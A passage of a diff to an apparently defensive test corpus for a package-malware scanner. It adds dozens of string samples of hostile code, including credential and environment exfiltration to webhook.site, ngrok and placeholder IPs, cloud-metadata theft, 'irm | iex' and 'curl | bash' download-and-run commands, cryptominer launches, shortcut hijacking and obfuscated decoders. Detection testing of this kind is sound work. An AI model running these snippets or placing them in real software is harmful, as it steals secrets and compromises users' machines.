@@ -10,8 +10,8 @@ each mechanism looks at (MIXED, QUOTING, CD, …): see corpus().
 """
 import base64
 import json
+import os
 import random
-import shlex
 
 from lazaret.scanner import core
 
@@ -21,6 +21,9 @@ FIELDS = ("shlex tokens", "_hook_tokens", "follow_hook", "install_script_risk", 
 
 # Realistic hook commands and install / import-time scripts
 CURATED = [
+    "bun run index.js", "bun index.js", "bun ./postinstall.mjs || node ./postinstall.mjs", "deno run -A main.ts",
+    "tsx scripts/x.ts", "ts-node -r ./pre.js src/x.ts", "bun run build", "bun install", "bun --smol run ./x.mjs",
+    "bun -e \"require('./a')\"", "BUN.EXE run x.cjs", "deno run --config deno.json main.ts", "vite-node ./s.mts",
     "node install.js", "node ./scripts/x.mjs", "node install", "node --no-warnings x.js",
     "node -r ./preload.js x.js", "node --require=./preload.cjs --import ./loader.mjs x.js",
     "node --title x y.js", "node -- x.js", "cd scripts && node x.js", "(cd lib; node a.js)",
@@ -152,6 +155,15 @@ CURATED = [
     "fork(dst);\n",
     "const body = await (await fetch(u)).text();\nfs.writeFileSync('cache.json', body);\n",   # written, not run: not it
     "fs.writeFileSync('x.js', localData);\nrequire('./x.js');\n",                              # no download: not it
+    # (0.1.8) run by a command line a literal holds: its program, or what start, cmd, sh … are given
+    "import os, requests\nr = requests.get('https://cdn.invalid/i.bat')\nopen('install.bat', 'wb').write(r.content)\n"
+    "os.system('set X=1 | start install.bat')\n",
+    "const https = require('https');\nhttps.get(u, (r) => r.pipe(fs.createWriteStream('run.sh')));\n"
+    "spawn('sh', ['-c', 'chmod +x run.sh && ./run.sh']);\n",
+    "import urllib.request, subprocess\nurllib.request.urlretrieve('http://x.invalid/x', 'x.bat')\n"
+    "subprocess.run('cmd /c x.bat', shell=True)\n",
+    "import urllib.request, subprocess\nurllib.request.urlretrieve('http://x.invalid/x', 'x.tgz')\n"
+    "subprocess.run('tar xzf x.tgz', shell=True)\n",                                      # unpacked, not run
 ]
 
 # The pieces random cases are made of. MIXED reaches every function; the
@@ -161,6 +173,7 @@ MIXED = [
     "&", "|", ";", "(", ")", "<", ">", "&&", "||", ";;", ">>", ">&", "&>", "2>&1", "<<", ">|", "|&",
     "=", "$", "-", "--", "0", "1", "2", "9", "a", "b", "x", "/", ".", "..", "~",
     "node", "nodejs", "node.exe", "NODE", "sh", "bash", "zsh", "sh.exe", "python", "python3", "python3.11",
+    "bun", "bun.exe", "deno", "tsx", "ts-node", "BUN", "run", "install", "a.ts", "b.tsx", "c.mts",
     "py", "PYTHON.EXE", "cd", "pushd", "env", "cross-env", "sudo", "exec", "A=1", "NODE_ENV=production",
     "-e", "-p", "--eval", "-r", "--require", "--import", "--loader=", "-c", "-m", "-O", "-X", "--no-warnings",
     "./x.js", "../y", "x.js", "a.mjs", "b.cjs", "s.sh", "p.py", "install", "scripts\\a.js", "scripts/",
@@ -275,7 +288,8 @@ SIGN_CURATED = [
 # The secrets are built here (fake, and not written out whole in the source).
 _TG = "1234567" + "89:AA" + "bC3dE5fG7hJ9kL1mN3pQ5rS7tV9wX1yZ3"
 _DISCORD = "discord.com/api/webhooks/" + "123456789012345678/" + "aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789-_aBcDeFgHiJkLmNoPqRsTuVwXyZ01"
-_SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuVwX"
+_SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuV12"
+_KEY = "Zx9" + "Qw7Er5Ty3Ui1Op0As2Df4Gh6"
 _XMR = "4" + ("AbCdEfGhJk" * 10)[:94]
 EXFIL = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "{", "}", "/", ".", "\\",
          "requests.post(", "fetch(", "https.get(", "import requests\n", "urllib.request.urlopen(", "curl -s ",
@@ -287,7 +301,8 @@ EXFIL = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "{",
          "webhook.site/abc", "abcdef12.ngrok-free.app", "2.tcp.eu.ngrok.io", "'bash'", "'nc'", "spawn(", "'-e'",
          "'/bin/sh'", "env = dict(os.environ)", "urlencode(env)", "const e = {...process.env}", "JSON.stringify(e)",
          "'203.0.113.5'", "sock.connect((ip, 80))", "'8.8.8.8'", _XMR, "'-o'", "stratum+tcp://pool.invalid:3333",
-         "subprocess.Popen(", "CreateShortcut", "--load-extension=x", ".lnk", "\U0001F600", "\u00e9"]
+         "subprocess.Popen(", "CreateShortcut", "--load-extension=x", ".lnk", "'.lnk'", ".Arguments = x",
+         ".TargetPath = y", "\U0001F600", "\u00e9"]
 # (0.1.8) DNS names built outside a template, in a name, in a shell command; dead drops; the host name
 # read through require('os') and imports (an alphabet of its own: the one above keeps its odds)
 EXFIL_MORE = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "{", "}", "/", ".", "\\",
@@ -301,16 +316,31 @@ EXFIL_MORE = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=",
               "fetch('https://x.github.io/c.json').then(r => r.json()).then(c => fetch(c.hook, {method: 'POST', body: h}))",
               "for w in cfg['hooks']:\n    ", "urllib.request.Request(w, data=b)",
               "with urlopen('https://x.github.io/c') as r:\n", "return cfg\n", "def load():\n    ", "\U0001F600"]
-EXFIL_REASONS = ("sends data to a Telegram bot whose token is written in the code",
-                 "sends data to a Discord webhook whose token is written in the code",
-                 "sends data to a Slack webhook whose key is written in the code",
-                 "reads credential files and sends data to an IP address",
-                 "collects files from several credential folders and sends data over the network",
-                 "sends the machine's user or host name to an address it hides in base64",
-                 "sends the machine's user or host name in a DNS lookup of a name it builds",
-                 "sends the machine's user or host name to an address it fetches at run time",
-                 "sends the machine's public IP address to a data-capture service", "runs a cryptocurrency miner",
-                 "rewrites browser shortcuts to load an extension")
+EXFIL_REASONS = (
+    # (0.1.8) shapes that are exfiltration wherever they are found
+    "sends data to a webhook whose secret is written in the code",
+    "collects files from several credential folders and sends data over the network",
+    "sends the machine's user or host name to an address it hides in base64",
+    "sends the machine's user or host name in a DNS lookup of a name it builds",
+    "sends the machine's user or host name to an address it fetches at run time",
+    "runs a cryptocurrency miner", "rewrites the shortcuts of programs on the machine",
+    # (0.1.8) local data read, followed and sent (install time), and a beacon
+    "sends environment variables over the network", "sends the machine's user or host name over the network",
+    "sends what local commands report about the machine over the network", "uploads a local file over the network",
+    "reads files outside the package and sends them over the network",
+    "sends the machine's public IP address over the network",
+    "sends what the cloud's instance metadata service gives it", "tells a server it was installed",
+    # (0.1.8) and at import time, where it goes
+    "reads credentials or the whole environment and sends data over the network",
+    "reads credentials or the whole environment and sends them to an exfiltration service",
+    "reads credentials or the whole environment and sends them to an IP address",
+    "reads local files and sends them to an exfiltration service", "reads local files and sends them to an IP address",
+    "sends the machine's user or host name to a data-capture service",
+    "sends the machine's user or host name to an IP address",
+    "sends what local commands report about the machine to a data-capture service",
+    "sends what local commands report about the machine to an IP address",
+    "sends the machine's public IP address to a data-capture service",
+    "sends the machine's public IP address to an IP address")
 EXFIL_CURATED = [
     # RequestBin by its host names only: requestBinary() is chromedriver's download function
     "function requestBinary(o, p) { return request(o).pipe(fs.createWriteStream(p)); }\n"
@@ -344,6 +374,14 @@ EXFIL_CURATED = [
     "import subprocess\ndef safe_run(path):\n    subprocess.Popen([path, '-u', '" + _XMR + "', '-o', "
     "'pool.invalid:8080', '-k'])\n",
     "shell = Dispatch('WScript.Shell')\ns = shell.CreateShortcut(p)\ns.Arguments = '--load-extension=X'\ns.Save()\n",
+    "for f in os.listdir(d):\n    if f.endswith('.lnk'):\n        s = shell.CreateShortcut(f)\n        s.Arguments = '-x'\n        s.Save()\n",
+    "for (const f of glob.sync('*.lnk')) { const s = sh.CreateShortcut(f); s.TargetPath = exe; s.Save(); }\n",
+    "for p in Path(start_menu).rglob('*.lnk'):\n    sc = shell.CreateShortcut(str(p))\n    sc.Arguments = a\n    sc.save()\n",
+    "files.filter(f => f.endsWith(\".lnk\")).forEach(f => { const s = ws.CreateShortcut(f); s.Arguments += ' --x'; s.Save(); });\n",
+    "if name.lower().endswith('.LNK'):\n    link = shell.CreateShortcut(name)\n    link.TargetPath = payload\n    link.Save()\n",
+    "s = shell.CreateShortcut(os.path.join(desktop, 'MyApp.lnk'))\ns.TargetPath = exe\ns.Save()\n",
+    "const { spawn } = require('child_process');\nspawn(bin, ['-o', 'stratum+tcp://pool.invalid:3333', '-u', '" + _XMR + "']);\n",
+    "import subprocess\nsubprocess.Popen(['./xmrig', '--url', 'pool.invalid:443', '--user', '" + _XMR + "', '--donate-level', '1'])\n",
     "const dns = require('dns');\nconst h = tryGet(os.hostname);\ndns.resolve(h + '.dns.x.invalid', cb);\n",
     "import subprocess as _sub, sys as _sys\n_url = 'https://203.0.113.4/t.pyz'\n_dest = '/tmp/t.pyz'\n"
     "_sub.run(['curl', '-k', '-L', '-s', _url, '-o', _dest], timeout=15)\n"
@@ -494,7 +532,7 @@ PROSE_CURATED = [
     'x = \\\n"""requests.post("https://webhook.site/0", data=socket.gethostname())"""\n',
 ]
 # persistence targets (0.1.7): an agent's or editor's auto-run settings, a
-# workflow, an editor extension, a runner, the Bun loader, a secrets dump —
+# workflow, an editor extension, a runner, a runtime loader, a secrets dump —
 # their paths whole and split, the writes, and the words around them
 PERSIST = ["\n", "\n", " ", "  ", "\t", "'", '"', "`", ", ", " + ", " / ", "/", "\\", "(", ")", ";", "|", "&", "=",
            ".claude/settings.json", ".claude/settings.local.json", ".gemini\\settings.json", ".vscode/tasks.json",
@@ -746,6 +784,279 @@ DECODED_CURATED = [
     "const t = f.readFileSync(require('path').join(require('os').homedir(), dec('Lm5wbXJj')), 'utf8');\n"
     "fetch('https://collector.invalid', { method: 'POST', body: t + '_authToken' });\n",
 ]
+# (0.1.8) character codes: literal codes (String.fromCharCode, ''.join(map(chr, …)),
+# bytes([…]).decode()), and the file's own decoders over codes or text —
+# their walks, transforms, keys and calls — and what is not read: codes out of
+# range or past 32 bits, a changed array, a call with a name for an argument
+
+
+def _cc_fnos(text, bias):
+    return ",".join(str(ord(ch) ^ (((i + bias) * 13 + 7) & 0xff)) for i, ch in enumerate(text))
+
+
+def _cc_xor(text, key):
+    return ",".join(str(ord(ch) ^ ord(key[i % len(key)])) for i, ch in enumerate(text))
+
+
+CC_FNOS = ("function decodeBuffer(buffer, bias) {\n  var assembled = '';\n"
+           "  for (var pos = 0; pos < buffer.length; pos++) {\n"
+           "    assembled += String.fromCharCode(buffer[pos] ^ ((pos + bias) * 13 + 7 & 0xff));\n  }\n"
+           "  return assembled;\n}\n")
+CC_MAP = "const dec = (a) => a.map((c) => String.fromCharCode(c - 3)).join('');\n"
+CC_SPLIT = "function r(s){return s.split('').map(function(c){return String.fromCharCode(c.charCodeAt(0) - 1)}).join('')}\n"
+CC_SPREAD = "const q = (a, k) => String.fromCharCode(...a.map((c, i) => c ^ k.charCodeAt(i % k.length)));\n"
+CC_PY_RANGE = "def d(a, k):\n    return ''.join(chr(a[i] ^ k) for i in range(len(a)))\n"
+CC_PY_ENUM = "def f(a, k):\n    return ''.join(chr(c ^ ord(k[i % len(k)])) for i, c in enumerate(a))\n"
+CC_PY_ITER = "def e(s):\n    out = ''\n    for c in s:\n        out += chr(ord(c) - 1)\n    return out\n"
+CC_CALLS = [f"decodeBuffer([{_cc_fnos('telemetry', 7)}], 7)", f"decodeBuffer([{_cc_fnos('runner.js', 3)}], 3)",
+            f"dec([{','.join(str(ord(ch) + 3) for ch in 'child_process')}])", "r('fyfd')", "r('dijme`qspdftt')",
+            f"q([{_cc_xor('https://c2.invalid/p', 'k3y')}], 'k3y')", f"d([{_cc_xor('os', chr(7))}], 7)",
+            f"f([{_cc_xor('subprocess', 'k3y')}], 'k3y')", "e('fybn')", "e('pt')",
+            f"decodeBuffer(_w, 7)", f"_w = [{_cc_fnos('runner.js', 7)}]", "_w.push(1)", "decodeBuffer(x, 7)",
+            "decodeBuffer([1,2,3], k)", "dec([0x6b, 0x6c])", "dec([2147483647])", "dec([])", "q([1], '')", "e('\\x')"]
+CHARCODE = ["\n", "\n", " ", ";", ",", "(", ")", "[", "]", "{", "}", "'", '"', "=", "+", "-", "^", "&", "%", "~", "0x",
+            "String.fromCharCode(", "String.fromCharCode(...[", ".apply(null, [", "chr(", "''.join(", "map(chr, ",
+            "bytes([", "bytearray((", ".decode()", ".decode('utf-8')", "for c in ", "for i in range(len(a))",
+            "for (var i = 0; i < a.length; i++)", "for (let j = 0; j < s.length; j++)", "a.map((c, i) => ",
+            "s.split('').map(function(c){return ", "for i, c in enumerate(a)", "function d(a, k) {",
+            "const e = (a) => ", "def g(a, k):\n    return ", "a[i]", "a[i] ^ k", "c ^ 7", "c.charCodeAt(0)",
+            "k.charCodeAt(i % k.length)", "ord(c)", "ord(k[i % len(k)])", "(i + k) * 13 + 7 & 0xff", ">>> 1", "<< 2",
+            "<< 40", ">> 1", "% 256", "a.length", "len(k)", "104,105", "0x68, 0x69", "10", "99999999999", "0xffffffff",
+            "2147483647", "'hi'", '"hi"', "7", "-3", "\u00e9", "\U0001F600",
+            "String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)", "String.fromCharCode(...[101,118,97,108])",
+            "String.fromCharCode.apply(null, [101,120,101,99])", "''.join(map(chr, [111, 115]))",
+            "''.join(chr(c) for c in [115,117,98,112,114,111,99,101,115,115])", '"".join([chr(x) for x in (101,118,97,108)])',
+            "bytes([111,115]).decode()", "bytearray([0x6f,0x73]).decode('utf-8')", "String.fromCharCode(7,8)",
+            "require(", "spawn(process.execPath, [path.join(__dirname, ", "exec(", "__import__(", "eval(",
+            CC_FNOS, CC_MAP, CC_SPLIT, CC_SPREAD, CC_PY_RANGE, CC_PY_ENUM, CC_PY_ITER, *CC_CALLS, *CC_CALLS,
+            # a decoder and a call of it
+            *[CC_FNOS + CC_CALLS[0], CC_MAP + CC_CALLS[2], CC_SPLIT + CC_CALLS[3], CC_SPREAD + CC_CALLS[5],
+              CC_PY_RANGE + CC_CALLS[6], CC_PY_ENUM + CC_CALLS[7], CC_PY_ITER + CC_CALLS[9]] * 3]
+# (0.1.8) exfiltration as a data flow: where local data is read, the names it is given, the requests that
+# send it (their data and their addresses), commands read as programs, shell scripts, a webhook's secret,
+# and where the data goes (an alphabet of its own)
+FLOW = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "{", "}", ".", "+", ":", "\\", "$",
+        "process.env.NPM_TOKEN", "process.env.HOME", "process.env", "{ ...process.env }", "os.environ",
+        "os.environ['AWS_SECRET_ACCESS_KEY']", "dict(os.environ)", "os.getenv('USER')", "os.hostname()",
+        "os.userInfo().username", "os.homedir()", "os.networkInterfaces()", "socket.gethostname()",
+        "const { hostname } = require('os');\n", "from getpass import getuser as gu\n", "hostname()", "gu()",
+        "require('os').hostname()", "tryGet(os.hostname)", "fs.readFileSync(", "open(", "'/etc/passwd'",
+        "'.env'", "path.join(os.homedir(), '.npmrc')", "os.path.expanduser('~/.aws/credentials')",
+        "execSync('whoami')", "subprocess.check_output(['id'])", "'http://169.254.169.254/latest/meta-data/'",
+        "requests.get('https://api.ipify.org').text", "const d = ", "h = ", "x = ", "data = ", "d", "h", "x",
+        "data", "e", "def send(url, data=None):\n    ", "function send(u, b) { ", "send(", "data=", "json=",
+        "return ", "return {\n    'h': ", "=> ", "async ", "fetch(", "fetch('https://x.invalid/', ",
+        "{ method: 'POST', body: ", "{ headers: { Authorization: ", "{ env: ", "axios.post('https://x.invalid/', ",
+        "requests.post('https://x.invalid/', ", "urllib.request.Request(url, data=", "urlopen(",
+        "https.get('https://x.invalid/?h=' + ", "https.request(o).end(", "const req = https.request(o);\n",
+        "req.write(", "req.data = ", "dns.lookup(", "socket.getaddrinfo(", "'.x.invalid.com'",
+        "'https://' + ", "`https://${", "}.x.invalid.com/`", "o.headers.Authorization = ", "spawn('curl', [",
+        "os.system('curl -d \"$(whoami)\" https://x.invalid/')\n", "exec(`curl https://x.invalid/?u=$(whoami)`)\n",
+        "const cmd = `curl -F f=@/etc/passwd https://x.invalid/`;\nexec(cmd);\n", "curl -d \"$(env)\" ",
+        "H=$(hostname)\n", "wget -qO- https://x.invalid/?h=$H\n", "| while read v;do nslookup $v.x.invalid.com;done",
+        "https://webhook.site/0", "https://requestbin.net/r/a", "https://abc123.ngrok-free.app/",
+        "http://203.0.113.9/c", "https://api.telegram.org/bot", "'https://hooks.x.invalid/in/" + _KEY + "'",
+        "x.open('POST', ", "TOKEN = '" + _TG + "'\n", "f'https://api.telegram.org/bot{TOKEN}/sendMessage'",
+        "module.exports = { h };\n", ".encode()", ".toString()", "JSON.stringify(", "json.dumps(", "\U0001F600",
+        "\u00e9", "typeof ", "!", " === 'x'", " && ", " ? 1 : 0", " if ", " else ", "Object.entries(process.env)",
+        ".filter(([k]) => k.startsWith('X_'))", ".filter(([k]) => !k.startsWith('npm_'))", "os.environ.items()",
+        "async fetch(t) { ", "cache.fetch(", "window.fetch(", "os.environ.get('NPM_TOKEN')", "'.ssh/id_rsa.pub'",
+        "urlopen('https://x.invalid/', data=", "'curl -fsSL https://x.invalid/i.sh | bash'", "execSync(", "console.log(",
+        "'powershell -c \"irm https://x.invalid/i.ps1 | iex\"'", "__spreadValues({}, process.env)",
+        "spawn('npm', ['i'], ", "require('fs').readFileSync("]
+FLOW_CURATED = [
+    # PowerShell handed to an exec call by a name given the command line
+    "import subprocess\nout = 'C:/x/a.exe'\n"
+    "dl = f\"powershell -Command \\\"Invoke-WebRequest -Uri 'https://x.invalid/a.exe' -OutFile '{out}'\\\"\"\n"
+    "subprocess.run(dl, shell=True)\nrun = f\"powershell -Command \\\"Start-Process '{out}'\\\"\"\n"
+    "subprocess.run(run, shell=True)\n",
+    "const c = 'powershell -c \"iwr https://x.invalid/p.ps1 | iex\"';\nrequire('child_process').execSync(c);\n",
+    "const help = 'run: powershell -c \"irm https://x.invalid/i.ps1 | iex\"';\nconsole.log(help);\n",
+    # a callback handed a send is code run later, not data sent (a name reused in it is another variable)
+    "const r = require('os').hostname();\nhttps.get(url, { headers: {} }, (r) => { r.pipe(f); });\n",
+    "const h = require('os').hostname();\nhttps.get(url, res => { const r = h; send(r) });\n",
+    "const h = require('os').hostname();\nhttps.request(u, { method: 'POST', onDone: function () { log(h); } });\n",
+    "const h = require('os').hostname();\nhttps.get('https://x.invalid/?h=' + h, res => {});\n",
+    # read, followed and sent (install time: the flow alone; import time: to a capture service or an IP)
+    "const { hostname } = require('os');\nfetch('https://x.invalid/', { method: 'POST', body: hostname() });\n",
+    "from socket import gethostname as gh\nimport requests\nrequests.post('https://webhook.site/0', data=gh())\n",
+    "fetch('https://x.invalid/', { method: 'POST', body: process.env.NPM_TOKEN });\n",
+    "fetch('https://x.invalid/', { headers: { Authorization: process.env.NPM_TOKEN } });\n",
+    "const https = require('https');\nhttps.get('https://webhook.site/r/abc?d=' + process.env.NPM_TOKEN);\n",
+    "const https = require('https');\nhttps.get('https://mirror.x.invalid/d?t=' + process.env.NPM_TOKEN);\n",
+    "const e = { ...process.env };\nfetch('https://x.invalid/', { method: 'POST', body: JSON.stringify(e) });\n",
+    "const env = process.env;\nfetch('https://x.invalid/', { method: 'POST', body: env.HOME });\n",
+    "import os, json, requests\nd = json.dumps(dict(os.environ))\nrequests.post('https://x.invalid/', data=d.encode())\n",
+    "const fs = require('fs');\nconst k = fs.readFileSync('/etc/passwd', 'utf8');\n"
+    "fetch('https://x.invalid/', { method: 'POST', body: k });\n",
+    "const os = require('os'), path = require('path'), fs = require('fs');\nconst p = path.join(os.homedir(), '.npmrc');\n"
+    "axios.post('https://x.invalid/', fs.readFileSync(p));\n",
+    "const fs = require('fs');\nconst d = fs.readFileSync('.env', 'utf8');\n"
+    "fetch('https://abcd.ngrok-free.app/', { method: 'POST', body: d });\n",
+    "const { execSync } = require('child_process');\nconst u = execSync('whoami').toString();\n"
+    "fetch('https://x.invalid/', { method: 'POST', body: u });\n",
+    "const os = require('os');\nfetch('https://webhook.site/0', { method: 'POST', body: os.homedir() });\n",
+    "import requests\ntok = requests.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/r').text\n"
+    "requests.post('https://x.invalid/', data=tok)\n",
+    "import requests\nip = requests.get('https://api.ipify.org').text\nrequests.post('https://webhook.site/0', json={'ip': ip})\n",
+    "import requests\nip = requests.get('https://ipinfo.io/json').json()\nrequests.get(MIRRORS[ip['country']])\n",
+    "import socket\nh = socket.gethostname()\nq = h + '.x.invalid.com'\nsocket.getaddrinfo(q, 80)\n",
+    "import socket\nh = socket.gethostname()\nsocket.getaddrinfo(h, 80)\n",
+    "import os, json, urllib.request\ndef send(url, data=None):\n    req = urllib.request.Request(url)\n"
+    "    req.data = data.encode()\n    urllib.request.urlopen(req)\nsend('https://webhook.site/0', data=json.dumps(dict(os.environ)))\n",
+    "import socket, requests\ndef info():\n    return {\n        'h': socket.gethostname(),\n    }\n"
+    "requests.post('https://x.invalid/', json=info())\n",
+    "const os = require('os');\nconst h = () => os.hostname();\nfetch('https://x.invalid/', { method: 'POST', body: h() });\n",
+    "const os = require('os');\nfunction h() { return os.hostname(); }\nmodule.exports = { h };\n"
+    "fetch('https://x.invalid/', { method: 'POST', body: JSON.stringify(module.exports) });\n",
+    "const os = require('os'), fs = require('fs');\nconst p = '/tmp/x-' + os.userInfo().username + '.log';\n"
+    "const h = fs.readFileSync(p);\nfetch('https://x.invalid/', { method: 'POST', body: h });\n",
+    "const o = { headers: {} };\no.headers.Authorization = process.env.NPM_TOKEN;\nfetch('https://x.invalid/', o);\n",
+    "const { spawn } = require('child_process');\nspawn('curl', ['https://x.invalid/'], { env: { ...process.env } });\n",
+    "const os = require('os');\nconst u = 'https://' + os.hostname() + '.x.invalid.com/';\nlib.check(u);\n",
+    "const os = require('os');\nconst h = os.hostname();\nnet.probe(`https://${h}.x.invalid.com/`);\n",
+    "const https = require('https');\nconst e = JSON.stringify(process.env);\nhttps.request(o).end(e);\n",
+    "require('https').get('https://x.invalid/?h=' + require('os').hostname());\n",
+    "const os = require('os');\nconst d = { h: tryGet(os.hostname) };\n"
+    "fetch('https://x.invalid/', { method: 'POST', body: JSON.stringify(d) });\n",
+    "const req = require('https').request('https://x.invalid/', { method: 'POST' }, () => {});\n"
+    "req.end(JSON.stringify({ h: require('os').hostname() }));\n",
+    # command lines a script hands a shell, and shell scripts
+    "import os\nos.system('curl -d \"$(whoami)\" https://x.invalid/')\n",
+    "const { exec } = require('child_process');\nexec(`curl -F \"f=@/etc/passwd\" https://x.invalid/`);\n",
+    "const { exec } = require('child_process');\nconst cmd = `curl https://x.invalid/?u=$(whoami)`;\nexec(cmd);\n",
+    "const { exec } = require('child_process');\nconst s = `curl -s https://webhook.site/x -d \"$(env)\"`;\n"
+    "exec('echo 1;' + s);\n",
+    "import os\nos.system(\"t=$(curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/x);"
+    " curl -d \\\"$t\\\" https://x.invalid/\")\n",
+    "import os\nos.system(\"a=$(hostname;whoami) && echo $a | xxd -p | while read ut;do nslookup $ut.x.invalid.com;done\")\n",
+    "import os\nos.system('curl -d \"$(curl -s https://ifconfig.me)\" https://x.invalid/')\n",
+    "#!/bin/sh\ncurl -d \"$(env)\" https://x.invalid/\n",
+    "cat ~/.ssh/id_rsa | curl -X POST --data-binary @- https://x.invalid/\n",
+    "H=$(hostname)\nwget -q -O- https://x.invalid/?h=$H\n",
+    "export T=$(printenv)\ncurl -d \"$T\" https://webhook.site/0\n",
+    "V=$(node -v)\ncurl -fsSL https://x.invalid/dl/$V/bin -o bin\n",
+    # a webhook whose secret is written in the code, any service
+    "import requests\nHOOK = 'https://hooks.x.invalid/in/" + _KEY + "'\ndef send(url, payload):\n"
+    "    return requests.post(url, json=payload)\nsend(HOOK, {'m': 1})\n",
+    "const x = new XMLHttpRequest();\nx.open('POST', 'https://in.x.invalid/w/" + _KEY + "');\nx.send(d);\n",
+    "import requests\nTOKEN = '" + _TG + "'\nrequests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?text={m}')\n",
+    "import requests\nrequests.post('https://x.invalid/api/v2/GetUserProfileInformation')\n",
+    "import requests\nrequests.get('https://x.invalid/blog/my-project-release-notes-2024')\n",
+    # where the data goes, at import time
+    "import socket, requests\nrequests.post('https://requestbin.net/r/abc', data=socket.gethostname())\n",
+    "const os = require('os');\nfetch('https://abc123.ngrok-free.app/', { method: 'POST', body: JSON.stringify(os.networkInterfaces()) });\n",
+    "const fs = require('fs');\nconst k = fs.readFileSync('/root/.ssh/id_rsa');\n"
+    "fetch('https://webhook.site/0', { method: 'POST', body: k });\n",
+    "import socket, requests\nrequests.post('http://203.0.113.9/c', data=socket.gethostname())\n",
+    "import os, json, requests\nrequests.post('https://api.telegram.org/bot/sendMessage', data=json.dumps(dict(os.environ)))\n",
+    "import os, requests\nrequests.post('https://api.telegram.org/bot/sendMessage', data={'t': os.environ['TG_TOKEN']})\n",
+    "import os, requests\nrequests.post('http://198.51.100.7/c', data=os.environ['NPM_TOKEN'])\n",
+    "import requests\nip = requests.get('https://api.ipify.org').text\nrequests.post('http://203.0.113.9/c', data=ip)\n",
+    "const { exec } = require('child_process');\nexec(`curl -X POST \"https://7195e44e.ngrok-free.app/$(ls /)\"`);\n",
+    # the instance's metadata sent (install time)
+    "const r = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/');\n"
+    "const t = await r.text();\nawait fetch('https://x.invalid/', { method: 'POST', body: t });\n",
+    'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | curl -X POST --data-binary @- https://x.invalid/\n',
+    'import os\nos.system(\'curl -d "$(curl -s http://169.254.169.254/latest/meta-data/)" https://x.invalid/\')\n',
+    "T=$(curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token)\n"
+    'curl -d "$T" https://x.invalid/\n',
+    # local files sent to a capture service or to an IP address (import time)
+    "const fs = require('fs');\nconst k = fs.readFileSync('/home/u/.ssh/id_ed25519');\n"
+    "fetch('https://webhook.site/0', { method: 'POST', body: k });\n",
+    "import requests\nrequests.post('https://abc.ngrok-free.app/u', files={'f': open('/etc/hosts', 'rb')})\n",
+    "const fs = require('fs');\nconst d = fs.readdirSync('/home');\naxios.post('https://requestbin.net/r/a', d);\n",
+    "import requests\nwith open('/etc/shadow') as f:\n    requests.post('https://webhook.site/1', data=f.read())\n",
+    "const fs = require('fs');\nconst d = fs.readFileSync('/etc/passwd');\n"
+    "fetch('http://203.0.113.9/c', { method: 'POST', body: d });\n",
+    "import requests\nrequests.post('http://198.51.100.7/u', data=open('/root/.aws/credentials').read())\n",
+    "const fs = require('fs'), os = require('os');\nconst k = fs.readFileSync(os.homedir() + '/.npmrc');\n"
+    "axios.post('http://203.0.113.9/n', k);\n",
+    # the public IP address sent to a capture service or to an IP address (import time)
+    "const r = await fetch('https://api.ipify.org');\nconst ip = await r.text();\n"
+    "await fetch('https://webhook.site/0', { method: 'POST', body: ip });\n",
+    "import requests\nip = requests.get('https://icanhazip.com').text\n"
+    "requests.post('https://abc.ngrok-free.app/', data=ip)\n",
+    "import urllib.request\nip = urllib.request.urlopen('https://ifconfig.me').read()\n"
+    "urllib.request.urlopen('https://requestbin.net/r/x', data=ip)\n",
+    "const r = await fetch('https://ipinfo.io/ip');\nconst ip = await r.text();\n"
+    "await fetch('http://203.0.113.9/i', { method: 'POST', body: ip });\n",
+    "import requests\nip = requests.get('https://checkip.amazonaws.com').text\n"
+    "requests.post('http://192.0.2.1/i', json={'ip': ip})\n",
+    "from urllib.request import urlopen\nip = urlopen('https://ident.me').read()\n"
+    "urlopen('http://203.0.113.5/', data=ip)\n",
+    "import requests\nip = requests.get('https://wtfismyip.com/text').text\n"
+    "requests.put('http://198.51.100.7/p', data=ip)\n",
+    # what the machine reports, sent to an IP address or a capture service (import time)
+    "const os = require('os');\n"
+    "fetch('http://203.0.113.9/r', { method: 'POST', body: JSON.stringify(os.networkInterfaces()) });\n",
+    "import os, requests\nrequests.post('http://198.51.100.7/r', data=os.popen('ls -la /').read())\n",
+    "const { execSync } = require('child_process');\nconst u = execSync('ls /home').toString();\n"
+    "fetch('http://203.0.113.9/', { method: 'POST', body: u });\n",
+    "const os = require('os');\naxios.post('http://192.0.2.10/h', { home: os.homedir() });\n",
+    "const os = require('os');\n"
+    "fetch('https://webhook.site/0', { method: 'POST', body: JSON.stringify(os.networkInterfaces()) });\n",
+    "import os, requests\nrequests.post('https://abc.ngrok-free.app/r', data=os.popen('ls /home').read())\n",
+    # tested, not used; a definition or a cache's fetch; the environment a condition narrows; a public key
+    "const hs = typeof process == 'object' && process ? typeof process.env == 'object' && process.env && process.env.DEBUG || 'x' : 'posix';\n"
+    "fetch('https://x.invalid/', { method: 'POST', body: hs });\n",
+    'class C { async fetch(t, e = {}) { return process.env; } }\n',
+    'const v = cache.fetch(k, { context: process.env });\n',
+    "window.fetch('https://x.invalid/', { method: 'POST', body: JSON.stringify(process.env) });\n",
+    "const s = Object.fromEntries(Object.entries(process.env).filter(([k]) => k.startsWith('X_')));\n"
+    "fetch('https://x.invalid/', { method: 'POST', body: JSON.stringify(s) });\n",
+    "const s = Object.entries(process.env).filter(([k]) => !k.startsWith('npm_'));\n"
+    "fetch('https://x.invalid/', { method: 'POST', body: JSON.stringify(s) });\n",
+    "import os, requests\nd = {k: v for k, v in os.environ.items() if 'TOKEN' in k}\n"
+    "requests.post('https://x.invalid/', json=d)\n",
+    "import os, requests\nd = {k: v for k, v in os.environ.items() if k.startswith('X_')}\n"
